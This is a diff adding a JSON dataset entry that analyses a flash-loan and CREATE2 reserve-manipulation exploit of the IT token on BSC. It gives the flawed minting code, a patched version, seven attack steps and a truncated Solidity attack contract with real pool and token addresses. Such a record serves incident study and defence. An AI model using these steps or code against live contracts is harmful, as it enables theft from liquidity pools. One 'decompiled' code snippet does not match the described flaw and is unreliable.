@@ -1,0 +1,36 @@
+{
+ "id": "2024__2024-03-XX_IT_FlashLoanMintReserveManipulation",
+ "source_file": "2024/2024-03-XX_IT_FlashLoanMintReserveManipulation.md",
+ "title": "IT — Flash Loan + CREATE2 mintToPoolIfNeeded Logic Flaw Analysis",
+ "date": "2024-03-01",
+ "protocol": "IT Token",
+ "chain": "BSC",
+ "loss_raw": "~$13,000",
+ "loss_usd": 13000.0,
+ "root_cause": "A reserve calculation flaw in the `mintToPoolIfNeeded()` function causes pre-deposited balances at a CREATE2-predicted address to be treated as legitimate reserves, enabling excessive minting through a 9-iteration swap cycle",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: mintToPoolIfNeeded reserve calculation flaw\nfunction mintToPoolIfNeeded() internal {\n    (uint112 r0, uint112 r1,) = pair.getReserves();\n    uint256 actualBalance = balanceOf(address(pair));\n    // Mints additional tokens if reserves < actual balance — manipulable\n    if (r0 < actualBalance) {\n        uint256 mintAmount = actualBalance - r0;\n        _mint(address(pair), mintAmount);\n        pair.sync();\n    }\n}\n\n// USDT pre-deposited at CREATE2-predicted address → triggers auto-swap on deployment\n// 9 iterations amplify the reserve imbalance\n\n//",
+  "// File: IT_decompiled.sol\ncontract IT {\n    function mint(address p0, int24 p1, int24 p2, uint128 p3, bytes memory p4) external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: minimum imbalance threshold + cooldown on mint condition\nuint256 private lastMintBlock;\n\nfunction mintToPoolIfNeeded() internal {\n    require(block.number > lastMintBlock + MINT_COOLDOWN, \"too frequent\");\n    (uint112 r0, uint112 r1,) = pair.getReserves();\n    uint256 actualBalance = balanceOf(address(pair));\n    uint256 diff = actualBalance > r0 ? actualBalance - r0 : 0;\n    require(diff > MIN_MINT_THRESHOLD, \"diff too small\");\n    lastMintBlock = block.number;\n    _mint(address(pair), diff);\n    pair.sync();\n}"
+ ],
+ "steps": [
+  "→ [1] Pre-compute Money contract address via CREATE2",
+  "→ [2] Transfer USDT to predicted address (before deployment)",
+  "→ [3] Flash-borrow 2,000 IT from V3 pool",
+  "→ [4] pancakeV3FlashCallback(): Deploy Money contract",
+  "→ [5] hack() recurses 9 times: repeatedly triggers mintToPoolIfNeeded()",
+  "→ [6] Final swap to extract USDT",
+  "→ [7] Repay V3 flash loan + ~$13K profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Pre-compute Money contract address via CREATE2\n  │\n  ├─→ [2] Transfer USDT to predicted address (before deployment)\n  │\n  ├─→ [3] Flash-borrow 2,000 IT from V3 pool\n  │\n  ├─→ [4] pancakeV3FlashCallback(): Deploy Money contract\n  │         └─ Constructor: approve IT + call hack()\n  │\n  ├─→ [5] hack() recurses 9 times: repeatedly triggers mintToPoolIfNeeded()\n  │         └─ Each cycle amplifies the reserve imbalance\n  │\n  ├─→ [6] Final swap to extract USDT\n  │\n  └─→ [7] Repay V3 flash loan + ~$13K profit",
+  "interface IIT {\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\ninterface IPancakeV3Pool {\n    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;\n}\n\ncontract Money {\n    constructor(address attacker, address itToken, uint256 itAmount) {\n        // Immediately approve IT tokens and call hack() from the constructor\n        IIT(itToken).approve(attacker, type(uint256).max);\n        IAttacker(attacker).hack(9);  // 9 recursive calls\n    }\n}\n\ncontract AttackContract {\n    IPancakeV3Pool constant v3Pool = IPancakeV3Pool(0x92b7807bF19b7DDdf89b706143896d05228f3121);\n    IIT           constant IT     = IIT(0x1AC5Fac863c0a026e029B173f2AE4D33938AB4"
+ ]
+}
